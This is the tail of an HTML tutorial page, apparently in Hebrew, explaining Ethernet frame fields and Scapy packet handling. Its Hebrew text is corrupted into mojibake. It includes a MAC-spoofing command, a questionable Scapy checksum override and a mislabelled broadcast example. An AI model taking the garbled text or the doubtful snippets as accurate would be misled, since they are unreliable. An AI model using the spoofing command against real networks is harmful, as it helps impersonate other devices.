# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•</span>
<span class="var">pkt</span>.haslayer(<span class="fn">ARP</span>)             <span class="cm"># ×‘×“×™×§×ª ×©×›×‘×”</span>
<span class="var">pkt</span>.getlayer(<span class="fn">IP</span>)              <span class="cm"># ×§×‘×œ×ª ×©×›×‘×”</span>
<span class="fn">hexdump</span>(<span class="var">pkt</span>)                  <span class="cm"># dump ×‘hex</span>
<span class="fn">bytes</span>(<span class="var">pkt</span>)                     <span class="cm"># bytes ×’×•×œ××™×™×</span>
<span class="fn">Ether</span>(<span class="fn">bytes</span>(<span class="var">pkt</span>))             <span class="cm"># Parse bytes</span></pre>
    </div>
  </div>

</section>

</main><!-- end main -->

<script>
// â”€â”€â”€ SCROLL PROGRESS + NAV â”€â”€â”€
function onScroll() {
  const doc = document.documentElement;
  const pct = (doc.scrollTop / (doc.scrollHeight - doc.clientHeight)) * 100;
  document.getElementById('prog').style.width = pct + '%';

  // active section
  const sections = document.querySelectorAll('section[id]');
  let cur = '';
  sections.forEach(s => {
    if (s.getBoundingClientRect().top < 120) cur = s.id;
  });
  document.querySelectorAll('[data-sec]').forEach(a => {
    a.classList.toggle('active', a.dataset.sec === cur);
  });
}
window.addEventListener('scroll', onScroll, { passive: true });

// â”€â”€â”€ REVEAL ON SCROLL â”€â”€â”€
const revObserver = new IntersectionObserver((entries) => {
  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
}, { threshold: 0.1 });
document.querySelectorAll('.reveal').forEach(el => revObserver.observe(el));

// â”€â”€â”€ FRAME FIELD DETAILS â”€â”€â”€
const FIELD_DATA = {
  preamble: {
    name: 'Preamble + SFD',
    color: '#8090bb',
    sub: '8 ×‘×ª×™× â€” 7 bytes preamble + 1 byte SFD',
    col1_title: '×ª×¤×§×™×“',
    col1: '×”-Preamble ××¡× ×›×¨×Ÿ ××ª ×”×¦×“×“×™× ×¢×œ ×ª×—×™×œ×ª ××¡×’×¨×ª. ×¨×¦×£ <strong>10101010</strong> (0xAA) Ã— 7 ×××¤×©×¨ ×œ× ××¢×Ÿ ×œ× ×¢×•×œ ×¢×œ ×”×©×™×“×•×¨. ×”-SFD (0xAB) ××¡××Ÿ "×”××¡×’×¨×ª ××ª×—×™×œ×” ×¢×›×©×™×•".',
    col2_title: '× ×§×•×“×•×ª ×—×©×•×‘×•×ª',
    col2: '×”-NIC ××¡×™×¨ ××ª ×”-Preamble ×œ×¤× ×™ ×©×”× ×ª×•×Ÿ ××’×™×¢ ×œ-OS. ×œ×›×Ÿ <strong>Wireshark ×•-Scapy ××™× × ××¦×™×’×™× ××•×ª×•</strong>. ×‘× ×™×ª×•×— ×ª× ×•×¢×” â€” ×œ× ×™×”×™×” ×’×œ×•×™.',
    ex_label: '// ×¢×¨×›×™×',
    ex: 'AA AA AA AA AA AA AA   â† Preamble Ã— 7\nAB                      â† SFD'
  },
  dst: {
    name: 'Destination MAC Address',
    color: '#ff7b35',
    sub: '6 ×‘×ª×™× â€” 48 ×‘×™×˜ â€” ×›×ª×•×‘×ª ×”××§×‘×œ',
    col1_title: '×›×™×¦×“ ×¤×•×¢×œ',
    col1: '×›×¨×˜×™×¡ ×”×¨×©×ª ×‘×•×“×§ ×©×“×” ×–×” ×œ×›×œ ××¡×’×¨×ª ×©××’×™×¢×”. ×× ×”×›×ª×•×‘×ª ×©×•× ×” ××”-MAC ×©×œ×• (×•××™× ×” Broadcast), ×”-NIC <strong>××ª×¢×œ× ××”××¡×’×¨×ª</strong> ×‘×—×•××¨×” â€” ×›×š × ×—×¡×›×ª ×¢×™×‘×•×“ ××™×•×ª×¨ ×‘-CPU.',
    col2_title: '×›×ª×•×‘×•×ª ××™×•×—×“×•×ª',
    col2: '<strong>FF:FF:FF:FF:FF:FF</strong> â€” Broadcast: ×›×•×œ× ××§×‘×œ×™×<br><strong>01:xx:xx:xx:xx:xx</strong> â€” Multicast: ×§×‘×•×¦×” ×¡×¤×¦×™×¤×™×ª<br><strong>00:00:00:00:00:00</strong> â€” Null (×œ× ×‘×©×™××•×© ×¨×’×™×œ)',
    ex_label: '// ×“×•×’××”',
    ex: '# Unicast (×œ× ××¢×Ÿ ××—×“)\nFF:FF:FF:FF:FF:FF  â† Broadcast\n# Scapy: Ether(dst="ff:ff:ff:ff:ff:ff")'
  },
  src: {
    name: 'Source MAC Address',
    color: '#00d4ff',
    sub: '6 ×‘×ª×™× â€” 48 ×‘×™×˜ â€” ×›×ª×•×‘×ª ×”×©×•×œ×—',
    col1_title: '××‘× ×” ×”-OUI',
    col1: '<strong>3 ×‘×ª×™× ×¨××©×•× ×™× = OUI</strong> (Organizationally Unique Identifier) â€” ××–×”×” ×™×¦×¨×Ÿ, ××•×§×¦×” ×¢"×™ IEEE.<br><br><strong>3 ×‘×ª×™× ××—×¨×•× ×™× = NIC</strong> â€” ××¡×¤×¨ ×™×™×—×•×“×™ ×©× ×§×‘×¢ ×¢"×™ ×”×™×¦×¨×Ÿ ×œ×›×¨×˜×™×¡ ×”×¡×¤×¦×™×¤×™.',
    col2_title: 'MAC Spoofing',
    col2: '×›×ª×•×‘×ª MAC × ×™×ª× ×ª <strong>×œ×©×™× ×•×™ ×‘×ª×•×›× ×”</strong> ×‘×›×œ ××¢×¨×›×ª ×”×¤×¢×œ×”. ×œ×›×Ÿ MAC ××™× ×” ×× ×’× ×•×Ÿ ×”×–×“×”×•×ª ××”×™××Ÿ!<br><br><code>sudo ip link set eth0 address aa:bb:cc:dd:ee:ff</code>',
    ex_label: '// ×‘×“×™×§×ª OUI',
    ex: 'd8:bb:c1 : 7a:3f:2e\nâ””â”€ OUI â”€â”˜   â””â”€ NIC â”€â”˜\n# Apple Inc.  # ×™×™×—×•×“×™'
  },
  type: {
    name: 'EtherType / Length',
    color: '#ffd600',
    sub: '2 ×‘×ª×™× â€” ××¦×™×™×Ÿ ×¤×¨×•×˜×•×§×•×œ ×”×©×›×‘×” ×”×‘××”',
    col1_title: '×›×™×¦×“ ×¤×•×¢×œ',
    col1: '×× ×”×¢×¨×š <strong>â‰¥ 0x0600</strong> â€” ×–×”×• EtherType (×¤×¨×•×˜×•×§×•×œ).<br>×× ×”×¢×¨×š <strong>&lt; 0x0600</strong> â€” ×–×”×• ××•×¨×š ×”-Payload (IEEE 802.3 ×™×©×Ÿ).<br><br>×‘×¤×•×¢×œ, ×”-Ethernet ×”××•×“×¨× ×™ ×ª××™×“ ××©×ª××© ×‘-EtherType.',
    col2_title: '×¢×¨×›×™× ×—×©×•×‘×™×',
    col2: '<strong>0x0800</strong> = IPv4<br><strong>0x0806</strong> = ARP<br><strong>0x86DD</strong> = IPv6<br><strong>0x8100</strong> = 802.1Q VLAN<br><strong>0x88CC</strong> = LLDP',
    ex_label: '// ×‘Scapy',
    ex: 'Ether(type=0x0800)  â† IPv4\nEther(type=0x0806)  â† ARP\n# Scapy ×××œ× ××•×˜×•××˜×™×ª!'
  },
  data: {
    name: 'Data / Payload',
    color: '#00ff88',
    sub: '46â€“1500 ×‘×ª×™× â€” ×”××™×“×¢ ×¢×¦××•',
    col1_title: '×’×‘×•×œ×•×ª ×’×•×“×œ',
    col1: '<strong>××™× ×™××•× 46 bytes</strong>: ×›×“×™ ×œ××¤×©×¨ ×–×™×”×•×™ ×”×ª× ×’×©×•×™×•×ª ×‘-CSMA/CD. ×× ×”× ×ª×•×Ÿ ×§×¦×¨ ×™×•×ª×¨ â€” ××•×¡×™×¤×™× <strong>Padding</strong> (×‘×ª×™× ××¤×¡) ×œ×¤× ×™ ×”-CRC.<br><br><strong>××§×¡×™××•× 1500 bytes (MTU)</strong>: ×—×‘×™×œ×•×ª ×’×“×•×œ×•×ª ×™×•×ª×¨ ××¤×•×¦×œ×•×ª ×‘-IP layer.',
    col2_title: '×ª×•×›×Ÿ ×”-Payload',
    col2: '×‘×“×¨×š ×›×œ×œ ×—×‘×™×œ×ª <strong>IPv4/IPv6</strong> ×©×‘×ª×•×›×”:<br>TCP Segment / UDP Datagram / ICMP Message<br><br>×‘×—×‘×™×œ×ª ARP â€” ×”× ×ª×•×Ÿ ×”×•× ×”-ARP message ×¢×¦××•.',
    ex_label: '// Jumbo Frames',
    ex: '# MTU ×¨×’×™×œ = 1500 bytes\n# Jumbo Frames = 9000 bytes\n# (× ×“×¨×© ×ª××™×›×” ×‘×¦×™×•×“ ×¨×©×ª)'
  },
  crc: {
    name: 'CRC32 / FCS',
    color: '#a855f7',
    sub: '4 ×‘×ª×™× â€” Frame Check Sequence',
    col1_title: '×›×™×¦×“ ×¢×•×‘×“',
    col1: '×”-CRC32 ××—×•×©×‘ ×¢×œ <strong>×›×œ ×©×“×•×ª ×”××¡×’×¨×ª</strong> (Dst + Src + Type + Data). ×”× ××¢×Ÿ ××—×©×‘ ××—×“×© ×•××©×•×•×”.<br><br>×× ×©×•× ×” â€” ×”××¡×’×¨×ª <strong>× ×–×¨×§×ª ×‘×©×§×˜</strong> (×œ× × ×©×œ×—×ª ×”×•×“×¢×ª ×©×’×™××”! TCP ×™×˜×¤×œ ×‘×›×š).',
    col2_title: '×’×™×œ×•×™ vs ×ª×™×§×•×Ÿ',
    col2: '×©×›×‘×ª ×”×§×• <strong>×¨×§ ××’×œ×”</strong> ×©×’×™××•×ª (×œ× ××ª×§× ×ª). ×ª×™×§×•×Ÿ ×”×•× ×ª×¤×§×™×“ TCP ×‘×©×›×‘×ª ×”×ª×¢×‘×•×¨×”.<br><br><strong>Scapy:</strong> ×××œ× CRC ××•×˜×•××˜×™×ª. ××¤×©×¨ ×œ×©× ×•×ª: <code>pkt[Ether].chksum = 0xDEAD</code>',
    ex_label: '// ×—×™×©×•×‘ ×‘-Python',
    ex: 'import binascii\ncrc = binascii.crc32(frame_bytes)\n# 4 bytes ×‘×¡×•×£ ×”××¡×’×¨×ª'
  }
};

function showField(name) {
  const data = FIELD_DATA[name];
  const detail = document.getElementById('field-detail');

  // toggle
  if (detail.dataset.active === name) {
    detail.classList.remove('show');
    detail.dataset.active = '';
    document.querySelectorAll('.frame-field').forEach(f => f.classList.remove('active'));
    return;
  }

  detail.dataset.active = name;
  document.querySelectorAll('.frame-field').forEach(f => f.classList.remove('active'));
  event.currentTarget.classList.add('active');

  detail.innerHTML = `
    <div class="fd-name" style="color:${data.color}">${data.name}</div>
    <div class="fd-sub">${data.sub}</div>
    <div class="fd-grid">
      <div class="fd-block">
        <div class="fd-block-title">// ${data.col1_title}</div>
        <div class="fd-block-body">${data.col1}</div>
      </div>
      <div class="fd-block">
        <div class="fd-block-title">// ${data.col2_title}</div>
        <div class="fd-block-body">${data.col2}</div>
        <div class="fd-example">
          <div class="ex-label">${data.ex_label}</div>
          <pre style="padding:0; margin-top:4px; background:none; font-size: 16px; color:${data.color}">${data.ex}</pre>
        </div>
      </div>
    </div>
  `;
  detail.classList.add('show');
}

// â”€â”€â”€ TABS â”€â”€â”€
function switchTab(group, name) {
  document.querySelectorAll(`[id^="${group}-"]`).forEach(el => el.classList.remove('active'));
  document.querySelectorAll(`#sec-${group === 'sniff' ? 'sniff' : 'craft'} .tab-btn`).forEach(b => b.classList.remove('active'));
  document.getElementById(`${group}-${name}`).classList.add('active');
  event.currentTarget.classList.add('active');
}

// â”€â”€â”€ COPY CODE â”€â”€â”€
function copyCode(btn) {
  const pre = btn.closest('.code-wrap').querySelector('pre');
  const text = pre.innerText;
  navigator.clipboard.writeText(text).then(() => {
    btn.textContent = 'âœ“ ×”×•×¢×ª×§';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = '×”×¢×ª×§'; btn.classList.remove('copied'); }, 1800);
  });
}
</script>
</body>
</html>
